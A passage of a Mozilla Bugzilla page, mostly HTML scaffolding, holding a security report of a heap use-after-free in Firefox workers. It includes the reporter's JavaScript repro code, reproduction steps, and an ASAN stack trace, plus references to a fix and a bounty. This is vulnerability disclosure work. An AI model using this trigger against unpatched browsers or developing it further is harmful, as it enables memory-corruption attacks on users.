    </td>

    <td class="flag-value">+
    </td>

  </tr>
          </tbody>
          <tbody class="edit-show" style="display:none"><tr>
    <td class="flag-setter"><div class="vcard vcard_1689" ><a class="email " href="/user_profile?user_id=1689" > <span class="fna">dveditz</span></a>
</div>
    </td>

    <td class="flag-name">
      <label title="Flag is used to track security bug bounty nominations. Mail security(at)mozilla.org to nominate a bug." for="flag-1868934">sec-bounty</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag-1868934-dirty">
      <select id="flag-1868934" name="flag-1868934"
        title="Flag is used to track security bug bounty nominations. Mail security(at)mozilla.org to nominate a bug."
        class="bug-flag">
            <option value="+" selected>+</option>
      </select>
    </td>


  </tr>
          </tbody>
          <tbody class="edit-hide"><tr>
    <td class="flag-setter"><div class="vcard vcard_151407" ><a class="email " href="/user_profile?user_id=151407" > <span class="fna">asuth</span></a>
</div>
    </td>

    <td class="flag-name">
        <a href="#c53"
            class="rel-time-title activity-ref"
            title="2 years ago"
        data-time="1585669294"
      >qe-verify</a>
    </td>

    <td class="flag-value">-
    </td>

  </tr>
          </tbody>
          <tbody class="edit-show" style="display:none"><tr>
    <td class="flag-setter"><div class="vcard vcard_151407" ><a class="email " href="/user_profile?user_id=151407" > <span class="fna">asuth</span></a>
</div>
    </td>

    <td class="flag-name">
      <label title="qe-verify: ? ➜ request to assess whether the bug should be tested manually
qe-verify: + ➜ request to verify the bug manually
qe-verify: – ➜ the bug will not/can not be verified manually" for="flag-1960978">qe-verify</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag-1960978-dirty">
      <select id="flag-1960978" name="flag-1960978"
        title="qe-verify: ? ➜ request to assess whether the bug should be tested manually
qe-verify: + ➜ request to verify the bug manually
qe-verify: – ➜ the bug will not/can not be verified manually"
          disabled
        class="bug-flag">
            <option value="-" selected>-</option>
      </select>
    </td>


  </tr>
          </tbody>
    <tbody class="edit-show" style="display:none"><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Is this bug/feature enabled in a release by a pref flag (see https://github.com/mozilla/bug-handling/blob/master/policy/feature-flags.md)?" for="flag_type-930">behind-pref</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-930-dirty">
      <select id="flag_type-930" name="flag_type-930"
        title="Is this bug/feature enabled in a release by a pref flag (see https://github.com/mozilla/bug-handling/blob/master/policy/feature-flags.md)?"
        class="bug-flag">
          <option value="X"></option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Flag tracking inclusion in the desktop Firefox product backlog." for="flag_type-846">firefox-backlog</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-846-dirty">
      <select id="flag_type-846" name="flag_type-846"
        title="Flag tracking inclusion in the desktop Firefox product backlog."
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Flag is used to track whether the bug report is eligible for inclusion in the Bug Bounty Hall of Fame." for="flag_type-913">sec-bounty-hof</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-913-dirty">
      <select id="flag_type-913" name="flag_type-913"
        title="Flag is used to track whether the bug report is eligible for inclusion in the Bug Bounty Hall of Fame."
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Whether the bug has a testcase in the qa test suite or not. Set it to &quot;in-qa-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-qa-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-qa-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword." for="flag_type-787">in-qa-testsuite</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-787-dirty">
      <select id="flag_type-787" name="flag_type-787"
        title="Whether the bug has a testcase in the qa test suite or not. Set it to &quot;in-qa-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-qa-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-qa-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>

      <td class="flag-requestee">
        <div id="requestee_type-787-container" style="display:none"><input
    name="requestee_type-787"
    value="" class="requestee bz_autocomplete_user"  id="requestee_type-787" 
  >
        </div>
      <td>

  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Whether the bug has a testcase in the test suite or not. Set it to &quot;in-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword." for="flag_type-37">in-testsuite</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-37-dirty">
      <select id="flag_type-37" name="flag_type-37"
        title="Whether the bug has a testcase in the test suite or not. Set it to &quot;in-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>


  </tr>
    </tbody>
  </table>
</div>
        </span>
    </div>

  
</div>
</div>

  
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-crash-data"
>
    <header id="module-crash-data-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Crash Data section"
           data-label-collapsed="Expand Crash Data section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-crash-data-content"
             aria-expanded="false"
             aria-labeledby="module-crash-data-title"
             aria-describedby="module-crash-data-subtitle"></div>
        <h2 class="module-title" id="module-crash-data-title">Crash Data</h2>
      </div>
    </header>
  <div class="module-content" id="module-crash-data-content" style="display:none"
  ><div class="field edit-show" id="field-cf_crash_signature" style="display:none"
>
    <div class="name">Signature:
    </div>


  
    <div class="value">
        <span id="field-value-cf_crash_signature">
        </span>
    </div>

  
</div>
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-security"
>
    <header id="module-security-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Security section"
           data-label-collapsed="Expand Security section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-security-content"
             aria-expanded="false"
             aria-labeledby="module-security-title"
             aria-describedby="module-security-subtitle"></div>
        <h2 class="module-title" id="module-security-title">Security</h2>
          <h3 class="module-subtitle" id="module-security-subtitle">
            (public)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-security-content" style="display:none"
  ><div class="groups edit-hide">
    This bug is publicly visible.
</div>

<div class="groups edit-show" style="display:none">


</div>
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-user-story" data-non-stick="1"
>
    <header id="module-user-story-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse User Story section"
           data-label-collapsed="Expand User Story section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-user-story-content"
             aria-expanded="false"
             aria-labeledby="module-user-story-title"
             aria-describedby="module-user-story-subtitle"></div>
        <h2 class="module-title" id="module-user-story-title">User Story</h2>
      </div>
    </header>
  <div class="module-content" id="module-user-story-content" style="display:none"
  >
    <pre id="user-story"></pre>
  </div>
</section>







<section class="module" id="module-attachments"
>
    <header id="module-attachments-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Attachments section"
           data-label-collapsed="Expand Attachments section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-attachments-content"
             aria-expanded="true"
             aria-labeledby="module-attachments-title"
             aria-describedby="module-attachments-subtitle"></div>
        <h2 class="module-title" id="module-attachments-title">Attachments</h2>
          <h3 class="module-subtitle" id="module-attachments-subtitle">
            (5 files)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-attachments-content"
  ><table role="table" class="layout-table" id="attachments">
    <tr class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=9059182">UAF_NoteXPCOMChild_Repro.js</a>
        </div>
        <div>
            <a href="#c0" class="attach-time activity-ref"><span class="rel-time" title="2019-04-17 21:44 PDT" data-time="1555562675">3 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_506912" ><a class="email " href="/user_profile?user_id=506912" > <span class="fna">Looben Yang</span></a>
</div></span>
        </div>
        <div class="attach-info">1.60 KB,
          text/javascript        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=9059182&amp;action=edit">Details</a>
    </tr>
    <tr class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=9059231">UAF_NoteXPCOMChild_EIP_41414141.js</a>
        </div>
        <div>
            <a href="#c2" class="attach-time activity-ref"><span class="rel-time" title="2019-04-18 03:24 PDT" data-time="1555583058">3 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_506912" ><a class="email " href="/user_profile?user_id=506912" > <span class="fna">Looben Yang</span></a>
</div></span>
        </div>
        <div class="attach-info">2.19 KB,
          text/javascript        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=9059231&amp;action=edit">Details</a>
    </tr>
    <tr class=" attach-patch
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=9130470">Bug 1545345 - Improve worker shutdown. r=baku,smaug</a>
        </div>
        <div>
            <a href="#c44" class="attach-time activity-ref"><span class="rel-time" title="2020-03-03 07:46 PST" data-time="1583250369">2 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_151407" ><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div></span>
        </div>
        <div class="attach-info">47 bytes,
          text/x-phabricator-request        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_1689" ><span class="fn">dveditz</span>
</div>:
              <a href="#a29524244_1689"
                  class="flag-name-status rel-time-title activity-ref"
                  title="2 years ago"
              data-time="1584997349"
            >
              sec-approval+</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=9130470&amp;action=edit">Details</a>&#x0020; |
  <a href="/attachment.cgi?id=9130470">Review</a>
    </tr>
    <tr class=" attach-patch
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=9141601">Bug 1545345 - Improve worker shutdown on ESR68. r=baku,smaug</a>
        </div>
        <div>
            <a href="#c54" class="attach-time activity-ref"><span class="rel-time" title="2020-04-19 21:44 PDT" data-time="1587357874">2 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_151407" ><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div></span>
        </div>
        <div class="attach-info">47 bytes,
          text/x-phabricator-request        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_75935" ><span class="fn">RyanVM</span>
</div>:
              <a href="#c57"
                  class="flag-name-status rel-time-title activity-ref"
                  title="2 years ago"
              data-time="1587358313"
            >
              approval-mozilla-esr68+</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=9141601&amp;action=edit">Details</a>&#x0020; |
  <a href="/attachment.cgi?id=9141601">Review</a>
    </tr>
    <tr class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=9144306">advisory.txt</a>
        </div>
        <div>
            <a href="#c59" class="attach-time activity-ref"><span class="rel-time" title="2020-04-29 06:32 PDT" data-time="1588167141">2 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_428608" ><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div></span>
        </div>
        <div class="attach-info">202 bytes,
          text/plain        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=9144306&amp;action=edit">Details</a>
    </tr>
</table>

<footer id="attachments-footer">
  <div id="attachments-actions">
  </div>
  
</footer>
  </div>
</section>



<script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr">
  init_module_visibility();
</script>



<meta name="firefox-versions" content="{&quot;FIREFOX_AURORA&quot;:&quot;&quot;,&quot;FIREFOX_DEVEDITION&quot;:&quot;94.0b9&quot;,&quot;FIREFOX_ESR&quot;:&quot;78.15.0esr&quot;,&quot;FIREFOX_ESR_NEXT&quot;:&quot;91.2.0esr&quot;,&quot;FIREFOX_NIGHTLY&quot;:&quot;95.0a1&quot;,&quot;FIREFOX_PINEBUILD&quot;:&quot;&quot;,&quot;LAST_MERGE_DATE&quot;:&quot;2021-10-04&quot;,&quot;LAST_RELEASE_DATE&quot;:&quot;2021-10-05&quot;,&quot;LAST_SOFTFREEZE_DATE&quot;:&quot;2021-09-30&quot;,&quot;LATEST_FIREFOX_DEVEL_VERSION&quot;:&quot;94.0b9&quot;,&quot;LATEST_FIREFOX_OLDER_VERSION&quot;:&quot;3.6.28&quot;,&quot;LATEST_FIREFOX_RELEASED_DEVEL_VERSION&quot;:&quot;94.0b9&quot;,&quot;LATEST_FIREFOX_VERSION&quot;:&quot;93.0&quot;,&quot;NEXT_MERGE_DATE&quot;:&quot;2021-11-01&quot;,&quot;NEXT_RELEASE_DATE&quot;:&quot;2021-11-02&quot;,&quot;NEXT_SOFTFREEZE_DATE&quot;:&quot;2021-10-28&quot;}">


<div id="comment-actions">
    <button type="button" id="bottom-btn" class="secondary" aria-label="Go to Page Bottom">Bottom &darr;</button>
  <div class="dropdown">
    <button type="button" id="comment-tags-btn" aria-haspopup="true" aria-label="Tags"
      aria-expanded="false" aria-controls="comment-tags-menu" class="dropdown-button minor">Tags &#9662;</button>
    <ul id="comment-tags-menu" role="menu" tabindex="0" class="dropdown-content left" style="display:none">
      <li role="presentation">
        <a role="menuitem" tabindex="-1" data-comment-tag="">Reset</a>
      </li>
    </ul>
  </div>
  <div class="dropdown">
    <button type="button" id="view-menu-btn" aria-haspopup="true" aria-label="Timeline"
      aria-expanded="false" aria-controls="view-menu" class="dropdown-button minor">Timeline &#9662;</button>
    <ul id="view-menu" role="menu" tabindex="0" class="dropdown-content left" style="display:none">
      <li role="presentation">
        <a id="view-reset" role="menuitem" tabindex="-1">Reset</a>
      </li>
      <li role="separator"></li>
      <li role="presentation">
        <a id="view-collapse-all" role="menuitem" tabindex="-1">Collapse All</a>
      </li>
      <li role="presentation">
        <a id="view-expand-all" role="menuitem" tabindex="-1">Expand All</a>
      </li>
      <li role="presentation">
        <a id="view-comments-only" role="menuitem" tabindex="-1">Comments Only</a>
      </li>
    </ul>
   </div>
</div>
<div class="change-set" id="c0"><div class="comment" data-id="14061999" data-no="0"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-0" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_506912" ><img src="https://secure.gravatar.com/avatar/387b65e77a270f67cd03547039f6b2eb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_506912" ><a class="email " href="/user_profile?user_id=506912" > <span class="fna">Looben Yang</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-0"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-0" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c0">Description</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-04-17 21:44 PDT" data-time="1555562675">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-0">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-9059182"
         class="attachment"
         data-id="9059182" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="UAF_NoteXPCOMChild_Repro.js">
      <meta itemprop="contentSize" content="1634">
      <meta itemprop="encodingFormat" content="text/javascript">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=9059182" itemprop="contentUrl">
        <span id="att-9059182-description" itemprop="description">UAF_NoteXPCOMChild_Repro.js</span></a>
        — <a href="attachment.cgi?id=9059182&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div>

  
    <div
        class="comment-text markdown-body "
        id="ct-0" data-comment-id="14061999" data-ismarkdown="true" ><p>Reproduction test case (full server code in attached file UAF_NoteXPCOMChild_Repro.js):</p>
<pre><code>Main Page code:
    &lt;script type=&quot;text/javascript&quot;&gt;
    var worker = new Worker(&quot;worker0.js&quot;);
    var bc0 = new BroadcastChannel(&quot;test_channel&quot;);
    setInterval(function(){ bc0.postMessage(&quot;AAAA&quot;);}, 10);
    setTimeout(function(){location.reload();},800); 
    &lt;/script&gt;

Worker code:
    var bc0 = new BroadcastChannel(&quot;test_channel&quot;);
    bc0.onmessage = function(e) {
    xmlReq0.send(); 
    xmlReq0.abort();
    }
    var fileReader1 =  new FileReader();
    fileReader1.onloadend = function(e) {
    xmlReq0.open(&quot;get&quot;, &quot;nofile.js&quot;, false);
    }
    var xmlReq0 = new XMLHttpRequest();
    close();
    fileReader1.readAsArrayBuffer(new Blob([&quot;AAAA&quot;], {type : &quot;text/html&quot;}));
    fileReader1.abort();
</code></pre>
<p>Steps to reproduce:<br>
1. Run server side script UAF_NoteXPCOMChild_Repro.js with Node.js (node UAF_NoteXPCOMChild_Repro.js).<br>
2. Enter <a href="http://localhost:12345" rel="nofollow">http://localhost:12345</a> in Firefox asan build.<br>
3. ASAN reports a Use After Free with XMLHttpRequest:</p>
<pre><code>    =================================================================
    ==7061==ERROR: AddressSanitizer: heap-use-after-free on address 0x6120000d0540 at pc 0x7faee9713b6f bp 0x7faed52472b0 sp 0x7faed52472a8
    READ of size 8 at 0x6120000d0540 thread T22 (DOM Worker)
</code></pre>
<p>Firefox version: 68.0a1 (2019-04-17) (64-bit)<br>
OS: Ubuntu 16.04 LTS 64bit</p>
<p>Stack trace:</p>
<pre><code>=================================================================
==7061==ERROR: AddressSanitizer: heap-use-after-free on address 0x6120000d0540 at pc 0x7faee9713b6f bp 0x7faed52472b0 sp 0x7faed52472a8
READ of size 8 at 0x6120000d0540 thread T22 (DOM Worker)
    #0 0x7faee9713b6e in ~nsCOMPtr_base /builds/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:331:7
    #1 0x7faee9713b6e in mozilla::WidgetEvent::~WidgetEvent() /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/BasicEvents.h:500
    #2 0x7faef0173e9d in mozilla::WidgetEvent::~WidgetEvent() /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/BasicEvents.h:500:26
    #3 0x7faeee23825b in mozilla::dom::Event::~Event() /builds/worker/workspace/build/src/dom/events/Event.cpp:113:5
    #4 0x7faeee1c9a3d in mozilla::dom::Event::~Event() /builds/worker/workspace/build/src/dom/events/Event.cpp:109:17
    #5 0x7faee7bf5ba6 in SnowWhiteKiller::~SnowWhiteKiller() /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2416:7
    #6 0x7faee7bf488e in nsCycleCollector::FreeSnowWhite(bool) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2607:3
    #7 0x7faee7bfe048 in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3582:3
    #8 0x7faee7bfd630 in nsCycleCollector::Collect(ccType, js::SliceBudget&amp;, nsICycleCollectorListener*, bool) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3411:9
    #9 0x7faee7c0119c in nsCycleCollector_collect(nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3947:21
    #10 0x7faef5088dc7 in callGCCallback /builds/worker/workspace/build/src/js/src/gc/GC.cpp:1840:3
    #11 0x7faef5088dc7 in js::gc::GCRuntime::maybeCallGCCallback(JSGCStatus) /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7375
    #12 0x7faef5089eff in ~AutoCallGCCallbacks /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7354:32
    #13 0x7faef5089eff in js::gc::GCRuntime::gcCycle(bool, js::SliceBudget, JS::GCReason) /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7464
    #14 0x7faef508d423 in js::gc::GCRuntime::collect(bool, js::SliceBudget, JS::GCReason) /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7622:9
    #15 0x7faef502347d in js::gc::GCRuntime::gc(JSGCInvocationKind, JS::GCReason) /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7710:3
    #16 0x7faeef978f39 in mozilla::dom::workerinternals::(anonymous namespace)::WorkerThreadPrimaryRunnable::Run() /builds/worker/workspace/build/src/dom/workers/RuntimeService.cpp:2325:5
    #17 0x7faee7db73a1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14
    #18 0x7faee7dbd4b8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10
    #19 0x7faee8e01e40 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:333:5
    #20 0x7faee8d2e5b2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10
    #21 0x7faee8d2e5b2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308
    #22 0x7faee8d2e5b2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290
    #23 0x7faee7db12fa in nsThread::ThreadFunc(void*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:454:11
    #24 0x7faf0884e05d in _pt_root /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:201:5
    #25 0x7faf084946b9 in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76b9)
    #26 0x7faf0751d41c in clone /build/glibc-Cl5G7W/glibc-2.23/misc/../sysdeps/unix/sysv/linux/x86_64/clone.S:109

0x6120000d0540 is located 0 bytes inside of 272-byte region [0x6120000d0540,0x6120000d0650)
freed by thread T22 (DOM Worker) here:
    #0 0x55c5c6461182 in free /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:124:3
    #1 0x7faee7bf5ba6 in SnowWhiteKiller::~SnowWhiteKiller() /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2416:7
    #2 0x7faee7bf488e in nsCycleCollector::FreeSnowWhite(bool) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2607:3
    #3 0x7faee7bfe048 in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3582:3
    #4 0x7faee7bfd630 in nsCycleCollector::Collect(ccType, js::SliceBudget&amp;, nsICycleCollectorListener*, bool) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3411:9
    #5 0x7faee7c0119c in nsCycleCollector_collect(nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3947:21
    #6 0x7faef5088dc7 in callGCCallback /builds/worker/workspace/build/src/js/src/gc/GC.cpp:1840:3
    #7 0x7faef5088dc7 in js::gc::GCRuntime::maybeCallGCCallback(JSGCStatus) /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7375
    #8 0x7faef5089eff in ~AutoCallGCCallbacks /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7354:32
    #9 0x7faef5089eff in js::gc::GCRuntime::gcCycle(bool, js::SliceBudget, JS::GCReason) /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7464
    #10 0x7faef508d423 in js::gc::GCRuntime::collect(bool, js::SliceBudget, JS::GCReason) /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7622:9
    #11 0x7faef502347d in js::gc::GCRuntime::gc(JSGCInvocationKind, JS::GCReason) /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7710:3
    #12 0x7faeef978f39 in mozilla::dom::workerinternals::(anonymous namespace)::WorkerThreadPrimaryRunnable::Run() /builds/worker/workspace/build/src/dom/workers/RuntimeService.cpp:2325:5
    #13 0x7faee7db73a1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14
    #14 0x7faee7dbd4b8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10
    #15 0x7faee8e01e40 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:333:5
    #16 0x7faee8d2e5b2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10
    #17 0x7faee8d2e5b2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308
    #18 0x7faee8d2e5b2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290
    #19 0x7faee7db12fa in nsThread::ThreadFunc(void*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:454:11
    #20 0x7faf0884e05d in _pt_root /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:201:5
    #21 0x7faf084946b9 in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76b9)

previously allocated by thread T22 (DOM Worker) here:
    #0 0x55c5c6461503 in __interceptor_malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:146:3
    #1 0x55c5c6495f9d in moz_xmalloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:68:15
    #2 0x7faeefd8af22 in operator new /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:131:10
    #3 0x7faeefd8af22 in mozilla::dom::XMLHttpRequestWorker::Construct(mozilla::dom::GlobalObject const&amp;, mozilla::dom::MozXMLHttpRequestParameters const&amp;, mozilla::ErrorResult&amp;) /builds/worker/workspace/build/src/dom/xhr/XMLHttpRequestWorker.cpp:1482
    #4 0x7faeefd8a049 in mozilla::dom::XMLHttpRequest::Constructor(mozilla::dom::GlobalObject const&amp;, mozilla::dom::MozXMLHttpRequestParameters const&amp;, mozilla::ErrorResult&amp;) /builds/worker/workspace/build/src/dom/xhr/XMLHttpRequest.cpp:51:10
    #5 0x7faeecffb4f7 in mozilla::dom::XMLHttpRequest_Binding::_constructor(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/XMLHttpRequestBinding.cpp:2557:64
    #6 0x7faef4007905 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:442:13
    #7 0x7faef4007905 in CallJSNativeConstructor /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:458
    #8 0x7faef4007905 in InternalConstruct(JSContext*, js::AnyConstructArgs const&amp;) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:651
    #9 0x7faef3fe4f1c in Interpret(JSContext*, js::RunState&amp;) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3063:16
    #10 0x7faef3fced88 in js::RunScript(JSContext*, js::RunState&amp;) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:422:10
    #11 0x7faef4009ef9 in js::ExecuteKernel(JSContext*, JS::Handle&lt;JSScript*&gt;, JSObject&amp;, JS::Value const&amp;, js::AbstractFramePtr, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:781:13
    #12 0x7faef400a66c in js::Execute(JSContext*, JS::Handle&lt;JSScript*&gt;, JSObject&amp;, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:814:10
    #13 0x7faef4287694 in bool Evaluate&lt;char16_t&gt;(JSContext*, js::ScopeKind, JS::Handle&lt;JSObject*&gt;, JS::ReadOnlyCompileOptions const&amp;, JS::SourceText&lt;char16_t&gt;&amp;, JS::MutableHandle&lt;JS::Value&gt;) /builds/worker/workspace/build/src/js/src/vm/CompilationAndEvaluation.cpp:539:10
    #14 0x7faef4286a0a in JS::Evaluate(JSContext*, JS::ReadOnlyCompileOptions const&amp;, JS::SourceText&lt;char16_t&gt;&amp;, JS::MutableHandle&lt;JS::Value&gt;) /builds/worker/workspace/build/src/js/src/vm/CompilationAndEvaluation.cpp:557:10
